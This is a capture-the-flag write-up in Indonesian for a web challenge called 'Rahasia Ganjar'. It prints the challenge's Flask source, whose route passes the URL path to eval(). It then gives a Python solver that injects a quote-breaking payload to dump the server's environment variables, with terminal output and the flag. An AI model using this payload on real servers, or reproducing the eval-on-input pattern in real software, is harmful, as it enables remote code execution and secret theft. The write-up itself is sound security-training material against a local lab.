# WriteUp: Rahasia Ganjar

## Overview

* **Judul:** Rahasia Ganjar
* **Kategori:** Input Injection
* **Poin:** 500
* **Deskripsi:** Bisa ngga lu mengungkap rahasia Ganjar?
* **Author:** (Unknown/Platform Specific)
* **URL:** `http://localhost:1337`

## Informasi Attachment

File yang diberikan adalah `codex6.yml`.

**Struktur Direktori:**

```bash
┌──(wanz)─(wanzkey㉿Hengker-Bwang)-[~/Pwn The Website/Input Injection/Rahasia Ganjar]
└─$ tree
.
├── codex6.yml
└── exploit.py

0 directories, 2 files

```

**Konten File (`codex6.yml`):**

```yaml
services:
  web:
    image: ghcr.io/hengkerrusia/codex6:latest
    ports:
      - "1337:8080"
    environment:
      - PWN=${PWN:-testuser}
    restart: unless-stopped

```

## Proses Penyelesaian

### 1. Menjalankan Environment

Challenge dijalankan menggunakan Docker Compose pada port **1337**.

**Output Terminal:**

```bash
┌──(wanz)─(wanzkey㉿Hengker-Bwang)-[~/Pwn The Website/Input Injection/Rahasia Ganjar]
└─$ PWN=WanZKey docker compose -f codex6.yml up -d --build
[+] up 14/14
 ✔ Image ghcr.io/hengkerrusia/codex6:latest Pulled                                                                 38.3s
 ✔ Network rahasiaganjar_default Created                                                                            0.4s
 ✔ Container rahasiaganjar-web-1 Created                                                                            0.7s

```

### 2. Reconnaissance & Source Code Analysis (White Box)

Melakukan inspeksi ke dalam container untuk mengambil source code `app.py`. Karena akses root dibatasi, digunakan flag `-u WanZKey`.

**Output Terminal:**

```bash
┌──(wanz)─(wanzkey㉿Hengker-Bwang)-[~/Pwn The Website/Input Injection/Rahasia Ganjar]
└─$ docker exec -u WanZKey rahasiaganjar-web-1 cat app.py
from flask import Flask, render_template_string, render_template
import os

app = Flask(__name__)

@app.route('/')
def home():
    return render_template('index.html', identity="Guest")

@app.route('/<path:user_input>')
def identity(user_input):
    try:
        result = eval(f'"{user_input}"')
        return render_template('index.html', identity=str(result))

    except Exception as e:
        return render_template('index.html', identity="System Error: Identity Processing Failed"), 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)

```

**Analisis Kerentanan:**

1. **Vulnerable Route:** Aplikasi menerima input melalui URL path `/<path:user_input>`.
2. **Injection Point:** Input tersebut dimasukkan ke dalam fungsi `eval()` menggunakan f-string yang dibungkus *double quotes* (`"`).
* Code: `result = eval(f'"{user_input}"')`


3. **Exploit Strategy:** Penyerang dapat memanipulasi string dengan menutup kutip dua (`"`) di awal, menyisipkan kode Python (seperti membaca `os.environ`), dan menutup kembali dengan kutip dua di akhir. Payload: `" + str(os.environ) + "`.

### 3. Exploitation

Mengeksploitasi celah tersebut dengan mengirimkan payload melalui URL Path untuk mendump Environment Variable server yang berisi flag.

## Script Solver

Script Python untuk mengotomatisasi pengiriman payload ke URL Path.

**File:** `exploit.py`

```python
import requests
import re
import urllib.parse

# Port 1337 (External)
URL = "http://localhost:1337"

def exploit():
    print(f"[*] Target: {URL}")
    
    # Payload: Breakout double quote + dump environ + close double quote
    # Server code: eval(f'"{user_input}"')
    raw_payload = '" + str(os.environ) + "'
    
    # Path Injection
    target_url = f"{URL}/{raw_payload}"
    print(f"[*] Sending Payload: {target_url}")
    
    try:
        r = requests.get(target_url)
        
        if r.status_code == 200:
            print("[+] Injection Successful!")
            
            # Regex Flag pwn{...}
            flag = re.search(r'pwn\{.*?\}', r.text)
            
            if flag:
                print(f"\n[!!!] FLAG FOUND: {flag.group(0)}\n")
            else:
                print("[-] Flag regex failed. Debug response:")
                print(r.text[:500])
        else:
            print(f"[-] Status Code: {r.status_code}")

    except Exception as e:
        print(f"[-] Error: {e}")

if __name__ == "__main__":
    exploit()

```

## Output Terminal Solver

```bash
┌──(wanz)─(wanzkey㉿Hengker-Bwang)-[~/Pwn The Website/Input Injection/Rahasia Ganjar]
└─$ python3 exploit.py
[*] Target: http://localhost:1337
[*] Sending Payload: http://localhost:1337/" + str(os.environ) + "
[+] Injection Successful!

[!!!] FLAG FOUND: pwn{77317bee327636df2be275ccd52688dd}

```

## Flag

```
pwn{77317bee327636df2be275ccd52688dd}

```
